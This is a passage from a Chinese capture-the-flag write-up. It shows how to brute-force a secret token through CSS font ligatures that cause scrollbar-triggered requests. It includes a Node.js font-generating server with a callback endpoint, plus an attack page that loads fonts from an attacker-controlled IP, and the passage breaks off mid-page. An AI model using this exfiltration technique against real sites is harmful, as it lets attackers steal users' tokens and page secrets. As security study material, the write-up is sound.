执行以下命令生成test.woff文件
    fontforge ./script.fontforge test.svg
接下来我们需要利用连字来搞一些事情。由于我们上面的字体中设置了`hack`连字，其字体宽度为9000，如果通过固定大小的iframe框引入时因为其宽度过大所以会出现滚动条，则在css代码中触发滚动条事件发出URL请求
将上述页面保存在test.html中
        0807hack
如果直接访问上述页面的话，宽度不够不会出现滚动条。所以需要通过另一个页面通过iframe标签引入
iframe.html
本地监听8888端口然后浏览器访问iframe.html页面
可以看到成功发出请求到8888端口
### 爆破token2
根据上面的demo我们可以知道宽度足够大的连字可以发出请求，那么我们便可以利用类似35c3的方法来爆破得到token2，将我们猜测的字符串设置为连字，宽度很大，可以设置为100000，保证宽度溢出出现滚动条，且格式为`xctf{*.}`而其余可见字符宽度设置为0。通过控制css设置``标签中的字体为上述我们设置的字体，如果出现了我们猜测的连字，则会加载连字，出现滚动条进而发出请求。如果未出现，则全部按宽度为0加载，不会出现滚动条。以上是大致的思路，为实现自动化，我们需要准备如下：
**1.部署一个生成.woff文件的服务器，根据路由参数(猜测的字符)来生成并发送.woff文件**
这里直接使用那位波兰作者的代码，用nodejs起的一个服务
    const express = require('express');
    const app = express();
    // Serwer ExprssJS domyślnie dodaje nagłówek ETag,
    // ale nam nie jest to potrzebne, więc wyłączamy.
    app.disable('etag');
    const PORT = 9999;
    const js2xmlparser = require('js2xmlparser');
    const fs = require('fs');
    const tmp = require('tmp');
    const rimraf = require('rimraf');
    const child_process = require('child_process');
    // Generujemy fonta dla zadanego przedrostka
    // i znaków, dla których ma zostać utworzona ligatura.
    function createFont(prefix, charsToLigature) {
        let font = {
            "defs": {
                "font": {
                    "@": {
                        "id": "hack",
                        "horiz-adv-x": "0"
                    },
                    "font-face": {
                        "@": {
                            "font-family": "hack",
                            "units-per-em": "1000"
                        }
                    },
                    "glyph": []
                }
            }
        };
        // 将0x20-0x7e的可见字符生成宽度为0的字体
        let glyphs = font.defs.font.glyph;
        for (let c = 0x20; c  {
            const glyph = {
                "@": {
                    "unicode": prefix + c,
                    "horiz-adv-x": "10000",
                    "d": "M1 0z",
                }
            }
            glyphs.push(glyph);
        });
        // 利用xml解析为.svg文件
        const xml = js2xmlparser.parse("svg", font);
        // A następnie wykorzystujemy fontforge
        // do zamiany SVG na WOFF.
        const tmpobj = tmp.dirSync();
        fs.writeFileSync(`${tmpobj.name}/font.svg`, xml);
        child_process.spawnSync("/usr/bin/fontforge", [
            `${__dirname}/script.fontforge`,
            `${tmpobj.name}/font.svg`
        ]);
        const woff = fs.readFileSync(`${tmpobj.name}/font.woff`);
        // Usuwamy katalog tymczasowy.
        rimraf.sync(tmpobj.name);
        // I zwracamy fonta w postaci WOFF.
        return woff;
    }
    // Endpoint do generowania fontów.
    app.get("/font/:prefix/:charsToLigature", (req, res) => {
        const { prefix, charsToLigature } = req.params;
        // Dbamy o to by font znalazł się w cache'u.
        res.set({
            'Cache-Control': 'public, max-age=600',
            'Content-Type': 'application/font-woff',
            'Access-Control-Allow-Origin': '*',
        });
        res.send(createFont(prefix, Array.from(charsToLigature)));
    });
    // Endpoint do przyjmowania znaków przez połączenie zwrotne
    app.get("/reverse/:chars", function(req, res) {
        res.cookie('chars', req.params.chars);
        res.set('Set-Cookie', `chars=${encodeURIComponent(req.params.chars)}; Path=/`);
        res.send();
    });
    app.get('/cookie.js', (req, res) => {
        res.sendFile('js.cookie.js', {
            root: './node_modules/js-cookie/src/'
        });
    });
    app.get('/index.html', (req, res) => {
        res.sendFile('index.html', {
            root: '.'
        });
    });
    app.listen(PORT, () => {
        console.log(`Listening on ${PORT}...`);
    })
这里只需用到/font的路由来生成并获取.woff文件。
**2.调用服务API并接收字体用于爆破的页面test.html，设置css逐位爆破**
        Document
            @font-face {
                font-family: "hack";
                src: url(http://192.168.170.129:9999/font/xctf%7b/d);